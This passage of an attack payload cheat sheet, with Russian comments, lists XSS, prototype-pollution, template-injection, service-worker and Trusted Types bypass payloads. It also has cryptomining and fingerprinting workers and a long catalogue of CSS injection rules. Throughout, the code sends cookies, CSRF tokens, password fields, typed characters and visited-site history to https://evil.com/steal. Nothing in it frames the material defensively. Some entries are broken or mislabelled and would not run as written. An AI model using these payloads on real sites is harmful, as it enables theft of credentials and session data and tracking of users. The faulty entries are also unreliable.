Object.assign({}, JSON.parse('{"__proto__": {"polluted": true}}'))
{}.__proto__.polluted = true
[].__proto__.polluted = true
(function(){}).__proto__.polluted = true

// 6.4 TEMPLATE INJECTION
{{constructor.constructor('alert(1)')()}}
{{7*7}}
{{alert(1)}}
[[constructor.constructor('alert(1)')()]]
[[7*7]]
[[alert(1)]]
<%= alert(1) %>
${alert(1)}
`${alert(1)}`
${7*7}
{{$on.constructor('alert(1)')()}}
<div v-html="'<img src=x onerror=alert(1)>'"></div>
<div ng-bind-html="'<img src=x onerror=alert(1)>'"></div>
<div dangerouslySetInnerHTML={{__html: '<img src=x onerror=alert(1)>'}} />
{% raw %}{{ '</script><script>alert(1)</script>' }}{% endraw %}



// css
{ css: 'body{background:url("javascript:alert(1)")}' }
{ style: 'background-image: url("javascript:alert(1)")' }
{ style: 'width: expression(alert(1))' } // для старых IE
'<style>@import "javascript:alert(1)";</style>'
'<div style="background:url(javascript:alert(1))">'

// HTML5/Web Components
'<math href="javascript:alert(1)">click</math>'
'<isindex action="javascript:alert(1)" type="image">'
'<video><source onerror="alert(1)">'
'<audio src=x onerror="alert(1)">'
'<embed src="javascript:alert(1)">'
'<object data="javascript:alert(1)">'
'<datalist id="x"><option>alert(1)</option></datalist>'

// DOM-базированные XSS
document.write(location.hash.substring(1))
document.write(document.URL)
document.write(document.documentURI)
document.write(window.name)
eval(location.hash.substring(1))
eval(document.URL)
new Function(location.hash.substring(1))()
setTimeout(location.hash.substring(1), 0)

// Service Workers

navigator.serviceWorker.register('sw.js', {scope: '/'})
navigator.serviceWorker.register('data:text/javascript,self.onfetch=(e)=>e.respondWith(fetch("/steal?"+e.request.url))')
self.addEventListener('install', () => { fetch('/steal?install') })
self.addEventListener('activate', () => { clients.claim() })

// WebAssembly
WebAssembly.compile(new Uint8Array([0,97,115,109,1,0,0,0])).then(() => alert(1))
new WebAssembly.Instance(new WebAssembly.Module(new Uint8Array([0,97,115,109,1,0,0,0])))
WebAssembly.compile('(module (func (export "xss") (result i32) i32.const 42))')

// для фреймворков

// React
'<img src=x onerror="alert(1)" />'
'<div dangerouslySetInnerHTML={{__html: "<img src=x onerror=alert(1)>"}} />'
'<a href="javascript:alert(1)">click</a>'

// Vue
'<div v-html="\'<img src=x onerror=alert(1)>\'"></div>'
'<a :href="\'javascript:alert(1)\'">click</a>'

// Angular
'<div [innerHTML]="\'<img src=x onerror=alert(1)>\'"></div>'
'<a [href]="\'javascript:alert(1)\'">click</a>'

// jQuery
$('div').html('<img src=x onerror=alert(1)>')
$('div').append('<img src=x onerror=alert(1)>')
$('div').prepend('<img src=x onerror=alert(1)>')


// Скрытые каналы (side-channel)
// Тайминги
performance.measure('xss', { start: Date.now(), end: Date.now() + alert(1) })

// Кэширование
fetch('/api', { cache: 'force-cache' }).then(r => performance.now())

// Размер ответа
fetch('/api').then(r => r.clone().text()).then(t => { if(t.length>100) alert(1) })

// Ошибки
addEventListener('error', (e) => fetch('/steal?error='+e.message))


// Битовые операции и трюки
// Через битовые сдвиги
[].sort.call`${alert(1)}`
[].map.call`${alert(1)}`
[].filter.call`${alert(1)}`

// Через Tagged templates
alert`${1}`
String.raw`<script>alert(1)<\/script>`

// Через Reflect
Reflect.apply(alert, null, [1])
Reflect.construct(Function, ['alert(1)']).call()

// Продвинутые обходы
// Через JSFuck (у тебя есть, но можно расширить)
[[]+[]][+[]][++[[]][+[]]+[][[]]][++[[]][+[]]][+[]] // 'a'
(![]+[])[+[]] // 'f'

// Через комбинации юникода
eval('\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0029')
eval(String.fromCodePoint(97,108,101,114,116,40,49,41))

// Через табуляцию и newline
javas\u0009cript:alert(1)
javas\u000Acript:alert(1)
javas\u000Dcript:alert(1)



// WebRTC для получения IP
new RTCPeerConnection().createDataChannel('').createOffer().then(o => setLocalDescription(o))

// Биткоин-майнинг в фоне
new Worker('data:application/javascript,while(1){}')

// Фингерпринтинг
new Worker('data:application/javascript,'+encodeURIComponent(`
  fetch('https://evil.com/steal?'+navigator.userAgent+','+screen.width+'x'+screen.height)
`))

// Крипто-майнинг
const worker = new Worker('data:application/javascript,'+encodeURIComponent(`
  while(true) { for(let i=0;i<1000000;i++) { Math.random() } }
`))

// Определение AdBlock
document.body.appendChild(document.createElement('div')).id = 'ad'
if(getComputedStyle(document.getElementById('ad')).display === 'none') { alert('adblock detected') }

 // 1. Через import()
import('data:application/javascript,alert(1)')

// 2. Через Dynamic import
const module = await import('data:text/javascript,export default function(){alert(1)}')

// 3. Через Web Workers с data URL
new Worker('data:application/javascript,postMessage(1);onmessage=(e)=>alert(e.data)')

// 4. Через import maps
<script type="importmap">{"imports":{"xss":"data:text/javascript,alert(1)"}}</script>
<script type="module">import 'xss'</script>

// 5. Через Trusted Types (обход)
trustedTypes.createPolicy('xss', { createHTML: (s) => s })
const policy = trustedTypes.defaultPolicy || { createHTML: (s) => s }
element.innerHTML = policy.createHTML('<img src=x onerror=alert(1)>')


// ### **Web Bluetooth/NFC/USB**
navigator.bluetooth.requestDevice().then(device => fetch('/steal?device='+device.id))
navigator.usb.getDevices().then(devices => alert(devices.length))
navigator.hid.getDevices().then(devices => alert('HID devices found'))

// ### **Web Authentication (WebAuthn)**
navigator.credentials.create({publicKey: {challenge: new Uint8Array(32)}})
navigator.credentials.get({publicKey: {challenge: new Uint8Array(32)}})

// ### **Payment Request API**
new PaymentRequest([{supportedMethods: 'basic-card'}], {total: {label: 'XSS', amount: {value: '0.01', currency: 'USD'}}}).show()

// ### **Web Share API**
navigator.share({title: 'XSS', text: 'alert(1)', url: 'javascript:alert(1)'})

//###  **Web Locks API**
navigator.locks.request('xss', {mode: 'exclusive'}, async lock => { alert(1) })

//### **Broadcast Channel**
const bc = new BroadcastChannel('xss')
bc.onmessage = (e) => eval(e.data)
bc.postMessage('alert(1)')


// ### **Web MIDI**
navigator.requestMIDIAccess().then(access => alert('MIDI devices: '+access.inputs.size))

//### **Web Speech**
const synth = window.speechSynthesis
const utter = new SpeechSynthesisUtterance('XSS')
synth.speak(utter)

// navigator.bluetooth.requestLEScan({acceptAllAdvertisements: true})
navigator.bluetooth.requestLEScan({acceptAllAdvertisements: true})

//  ### **File System Access API**
window.showOpenFilePicker().then(handles => handles[0].getFile().then(f => alert(f.name)))

//  CSS ИНЪЕКЦИИ 
<link rel="stylesheet" href="https://evil.com/xss.css">
<style>@import url('https://evil.com/xss.css');</style>
<style>body { background: url('https://evil.com/steal?' + document.cookie); }</style>
<style>input[value^="a"] { background: url('https://evil.com/steal?char=a'); }</style>
<style>input[value^="b"] { background: url('https://evil.com/steal?char=b'); }</style>
<style>input[value^="c"] { background: url('https://evil.com/steal?char=c'); }</style>
<style>input[type=password] { background: url('https://evil.com/steal?field=password'); }</style>
<style>#token { background: url('https://evil.com/steal?token=' + encodeURIComponent(getComputedStyle(document.getElementById('token')).textContent)); }</style>
<style>@font-face { font-family: 'xss'; src: url('https://evil.com/steal?font'); }</style>
<style>@keyframes xss { from { background: url('https://evil.com/steal?start'); } }</style>
<style>div:hover { background: url('https://evil.com/steal?hover'); }</style>
<style>@media print { body { background: url('https://evil.com/steal?print'); } }</style>
<style>@import 'https://evil.com/steal?import';</style>
<style>html { background: url('javascript:alert(1)'); }</style>
<style>body { background: url('data:text/html,<script>alert(1)</script>'); }</style>
<style>* { color: expression(alert(1)); }</style> // IE only
<style>div { width: expression(alert(1)); }</style> // IE only
<style>@media all and (min-width:0) { body { background: url('https://evil.com/steal?media'); } }</style>
<style>@supports (display: flex) { body { background: url('https://evil.com/steal?supports'); } }</style>
<style>@document url('https://target.com') { body { background: url('https://evil.com/steal?doc'); } }</style>
<style>@page { size: 100px 100px; background: url('https://evil.com/steal?page'); }</style>
<style>@viewport { width: 100px; background: url('https://evil.com/steal?viewport'); }</style>
<style>@counter-style xss { system: cyclic; symbols: url('https://evil.com/steal?counter'); }</style>
<style>@property --xss { syntax: '<color>'; inherits: false; initial-value: url('https://evil.com/steal?property'); }</style>

/* 1. БАЗОВЫЕ ЗАПРОСЫ */
background: url('https://evil.com/steal');
background-image: url('https://evil.com/steal');
background-color: url('https://evil.com/steal');
list-style-image: url('https://evil.com/steal');
cursor: url('https://evil.com/steal');
src: url('https://evil.com/steal');
@import 'https://evil.com/steal';
@import url('https://evil.com/steal');

/* 2. ЭКСФИЛЬТРАЦИЯ ЧЕРЕЗ СЕЛЕКТОРЫ */
input[name="token"][value^="a"] { background: url('https://evil.com/?a'); }
input[name="token"][value^="b"] { background: url('https://evil.com/?b'); }
input[name="token"][value^="c"] { background: url('https://evil.com/?c'); }
input[name="token"][value^="d"] { background: url('https://evil.com/?d'); }
input[name="token"][value^="e"] { background: url('https://evil.com/?e'); }
input[name="token"][value^="f"] { background: url('https://evil.com/?f'); }
input[name="token"][value$="g"] { background: url('https://evil.com/?g'); }
input[name="token"][value$="h"] { background: url('https://evil.com/?h'); }
input[name="token"][value$="i"] { background: url('https://evil.com/?i'); }
input[name="token"][value*="j"] { background: url('https://evil.com/?j'); }

/* 3. АТАКИ НА АТРИБУТЫ */
[data-secret="123"] { background: url('https://evil.com/?data=123'); }
[id="token"] { background: url('https://evil.com/?id=token'); }
[class="csrf"] { background: url('https://evil.com/?class=csrf'); }
[type="password"] { background: url('https://evil.com/?type=password'); }
[name="csrf"] { background: url('https://evil.com/?name=csrf'); }
[href*="admin"] { background: url('https://evil.com/?href=admin'); }

/* 4. ПОЗИЦИОННЫЕ СЕЛЕКТОРЫ */
input:nth-child(1) { background: url('https://evil.com/?pos=1'); }
input:nth-of-type(2) { background: url('https://evil.com/?pos=2'); }
input:first-child { background: url('https://evil.com/?first'); }
input:last-child { background: url('https://evil.com/?last'); }
input:only-child { background: url('https://evil.com/?only'); }

/* 5. ПСЕВДОКЛАССЫ СОСТОЯНИЯ */
input:focus { background: url('https://evil.com/?focus'); }
input:hover { background: url('https://evil.com/?hover'); }
input:active { background: url('https://evil.com/?active'); }
input:checked { background: url('https://evil.com/?checked'); }
input:disabled { background: url('https://evil.com/?disabled'); }
input:enabled { background: url('https://evil.com/?enabled'); }
input:read-only { background: url('https://evil.com/?readonly'); }
input:read-write { background: url('https://evil.com/?readwrite'); }
input:required { background: url('https://evil.com/?required'); }
input:optional { background: url('https://evil.com/?optional'); }
input:valid { background: url('https://evil.com/?valid'); }
input:invalid { background: url('https://evil.com/?invalid'); }
input:in-range { background: url('https://evil.com/?inrange'); }
input:out-of-range { background: url('https://evil.com/?outrange'); }
input:placeholder-shown { background: url('https://evil.com/?placeholder'); }

/* 6. СТРУКТУРНЫЕ ПСЕВДОКЛАССЫ */
:root { background: url('https://evil.com/?root'); }
:empty { background: url('https://evil.com/?empty'); }
:target { background: url('https://evil.com/?target'); }
:lang(en) { background: url('https://evil.com/?lang=en'); }
:lang(ru) { background: url('https://evil.com/?lang=ru'); }
:not(.safe) { background: url('https://evil.com/?notsafe'); }

/* 7. МЕДИА-ЗАПРОСЫ */
@media all { body { background: url('https://evil.com/?media=all'); } }
@media print { body { background: url('https://evil.com/?print'); } }
@media screen { body { background: url('https://evil.com/?screen'); } }
@media speech { body { background: url('https://evil.com/?speech'); } }
@media (min-width: 1024px) { body { background: url('https://evil.com/?width=1024'); } }
@media (max-width: 768px) { body { background: url('https://evil.com/?width=768'); } }
@media (min-height: 800px) { body { background: url('https://evil.com/?height=800'); } }
@media (orientation: landscape) { body { background: url('https://evil.com/?landscape'); } }
@media (orientation: portrait) { body { background: url('https://evil.com/?portrait'); } }
@media (aspect-ratio: 16/9) { body { background: url('https://evil.com/?ratio=16:9'); } }
@media (color) { body { background: url('https://evil.com/?color'); } }
@media (monochrome) { body { background: url('https://evil.com/?monochrome'); } }
@media (hover: hover) { body { background: url('https://evil.com/?hover=yes'); } }
@media (hover: none) { body { background: url('https://evil.com/?hover=no'); } }
@media (pointer: fine) { body { background: url('https://evil.com/?pointer=fine'); } }
@media (pointer: coarse) { body { background: url('https://evil.com/?pointer=coarse'); } }
@media (prefers-color-scheme: dark) { body { background: url('https://evil.com/?dark'); } }
@media (prefers-color-scheme: light) { body { background: url('https://evil.com/?light'); } }
@media (prefers-reduced-motion: reduce) { body { background: url('https://evil.com/?nomotion'); } }
@media (display-mode: fullscreen) { body { background: url('https://evil.com/?fullscreen'); } }

/* 8. ФОНТЫ И @FONT-FACE */
@font-face {
    font-family: 'xss';
    src: url('https://evil.com/steal?font');
    font-family: 'xss2';
    src: url('data:font/woff,AA...');
}

@font-face {
    font-family: 'xss3';
    src: url('javascript:alert(1)');
}

/* 9. КЛЮЧЕВЫЕ КАДРЫ (ANIMATIONS) */
@keyframes steal {
    from { background: url('https://evil.com/?start'); }
    to { background: url('https://evil.com/?end'); }
}

@keyframes xss {
    0% { background: url('https://evil.com/?0'); }
    25% { background: url('https://evil.com/?25'); }
    50% { background: url('https://evil.com/?50'); }
    75% { background: url('https://evil.com/?75'); }
    100% { background: url('https://evil.com/?100'); }
}

div {
    animation: steal 1s infinite;
}

/* 10. CSS КОУНТЕРЫ */
body {
    counter-reset: xss;
    counter-increment: xss;
    content: counter(xss, url('https://evil.com/?counter'));
}

/* 11. ПСЕВДОЭЛЕМЕНТЫ */
::before { content: url('https://evil.com/?before'); }
::after { content: url('https://evil.com/?after'); }
::first-letter { background: url('https://evil.com/?firstletter'); }
::first-line { background: url('https://evil.com/?firstline'); }
::selection { background: url('https://evil.com/?selection'); }
::backdrop { background: url('https://evil.com/?backdrop'); }
::placeholder { background: url('https://evil.com/?placeholder2'); }
::marker { background: url('https://evil.com/?marker'); }
::spelling-error { background: url('https://evil.com/?spelling'); }
::grammar-error { background: url('https://evil.com/?grammar'); }

/* 12. @SUPPORTS */
@supports (display: flex) { body { background: url('https://evil.com/?flex'); } }
@supports (display: grid) { body { background: url('https://evil.com/?grid'); } }
@supports (position: sticky) { body { background: url('https://evil.com/?sticky'); } }
@supports (backdrop-filter: blur()) { body { background: url('https://evil.com/?backdropfilter'); } }
@supports not (display: flex) { body { background: url('https://evil.com/?noflex'); } }

/* 13. @DOCUMENT (Firefox только) */
@-moz-document url-prefix('https://target.com') {
    body { background: url('https://evil.com/?target'); }
}

@-moz-document domain('example.com') {
    body { background: url('https://evil.com/?domain'); }
}

/* 14. @PAGE */
@page :first { background: url('https://evil.com/?pagefirst'); }
@page :left { background: url('https://evil.com/?pageleft'); }
@page :right { background: url('https://evil.com/?pageright'); }

/* 15. @VIEWPORT */
@viewport { width: 100px; background: url('https://evil.com/?viewport'); }

/* 16. @COUNTER-STYLE */
@counter-style xss {
    system: cyclic;
    symbols: url('https://evil.com/?counterstyle');
}

/* 17. @PROPERTY */
@property --xss {
    syntax: '<color>';
    inherits: false;
    initial-value: url('https://evil.com/?property');
}

/* 18. CSS-ВЫРАЖЕНИЯ (IE only) */
expression(alert(1))
expression(eval('alert(1)'))
expression(document.location='https://evil.com')
expression(window.open('https://evil.com'))

div {
    width: expression(alert(1));
    height: expression(eval('alert(1)'));
    color: expression(document.cookie);
    background: expression(fetch('https://evil.com/steal?c='+document.cookie));
}

/* 19. CSS-ПЕРЕМЕННЫЕ (CUSTOM PROPERTIES) */
:root {
    --xss: url('https://evil.com/steal');
    --xss2: 'https://evil.com/steal';
    --xss3: alert(1);
}

div {
    background: var(--xss);
    content: var(--xss2);
    font-family: var(--xss3);
}

/* 20. АТАКИ НА ИСТОРИЮ */
a:visited { background: url('https://evil.com/?visited'); }
a[href*="google"]:visited { background: url('https://evil.com/?google'); }
a[href*="facebook"]:visited { background: url('https://evil.com/?facebook'); }
a[href*="youtube"]:visited { background: url('https://evil.com/?youtube'); }
a[href*="twitter"]:visited { background: url('https://evil.com/?twitter'); }
a[href*="instagram"]:visited { background: url('https://evil.com/?instagram'); }
a[href*="github"]:visited { background: url('https://evil.com/?github'); }
a[href*="stackoverflow"]:visited { background: url('https://evil.com/?stackoverflow'); }

/* 21. ИНЛАЙН-СТИЛИ */
<div style="background: url('https://evil.com/steal')">
<div style="background-image: url('https://evil.com/steal')">
<div style="background-color: url('https://evil.com/steal')">
<div style="list-style-image: url('https://evil.com/steal')">
<div style="cursor: url('https://evil.com/steal')">
<div style="content: url('https://evil.com/steal')">
<div style="src: url('https://evil.com/steal')">
<div style="behavior: url('https://evil.com/steal')">
<div style="filter: url('https://evil.com/steal')">
<div style="mask: url('https://evil.com/steal')">

/* 22. CSS-ФИЛЬТРЫ */
filter: url('https://evil.com/steal');
filter: url('javascript:alert(1)');
backdrop-filter: url('https://evil.com/steal');

/* 23. КЛИП-ПАТИ */
clip-path: url('https://evil.com/steal');
clip-path: url('javascript:alert(1)');
mask-image: url('https://evil.com/steal');
mask-image: url('javascript:alert(1)');

/* 24. @IMPORT ВНУТРИ СТИЛЕЙ */
<style>@import 'https://evil.com/steal';</style>
<style>@import url('https://evil.com/steal');</style>
<style>@import 'https://evil.com/steal' screen;</style>
<style>@import 'https://evil.com/steal' print;</style>

/* 25. CSS ВНУТРИ HTML */
<style>body { background: url('https://evil.com/steal'); }</style>
<style>@import 'https://evil.com/steal';</style>
<link rel="stylesheet" href="https://evil.com/steal">
<?xml-stylesheet href="https://evil.com/steal" type="text/css"?>
<style>@import 'data:text/css,body{background:url("https://evil.com/steal")}';</style>
<style>@import 'https://evil.com/steal.css';</style>
<style>@import '//evil.com/steal.css';</style>

/* 26. DATA:URL В CSS */
background: url('data:image/svg+xml,<svg onload=alert(1)>');
background: url('data:text/html,<script>alert(1)</script>');
background: url('data:text/css,body{background:red}');
src: url('data:font/woff,AA...');
cursor: url('data:image/png,base64,...');

/* 27. JAVASCRIPT: В CSS (не везде) */
background: url('javascript:alert(1)');
background-image: url('javascript:alert(1)');
src: url('javascript:alert(1)');
@import 'javascript:alert(1)';
cursor: url('javascript:alert(1)');

/* 28. SVG В CSS */
background: url('data:image/svg+xml,<svg onload=alert(1)>');
background: url('data:image/svg+xml,<svg><script>alert(1)</script></svg>');
background: url('https://evil.com/xss.svg');
mask: url('https://evil.com/xss.svg#mask');

/* 29. CSS-СЧЁТЧИКИ ДЛЯ ЭКСФИЛЬТРАЦИИ */
div::before {
    counter-increment: xss;
    content: counter(xss, url('https://evil.com/?count'));
}

/* 30. КОМБИНИРОВАННЫЕ АТАКИ */
<style>
    @import 'https://evil.com/steal.css';
    @font-face { font-family: xss; src: url('https://evil.com/steal?font'); }
    @keyframes steal { from { background: url('https://evil.com/steal?start'); } }
    div { animation: steal 1s; }
    input[name="csrf"][value^="a"] { background: url('https://evil.com/?a'); }
    input[name="csrf"][value^="b"] { background: url('https://evil.com/?b'); }
    @media (min-width: 1024px) { body { background: url('https://evil.com/?desktop'); } }
    @media (max-width: 768px) { body { background: url('https://evil.com/?mobile'); } }
    a:visited { background: url('https://evil.com/?visited'); }
    expression(alert(1));
</style>
```











































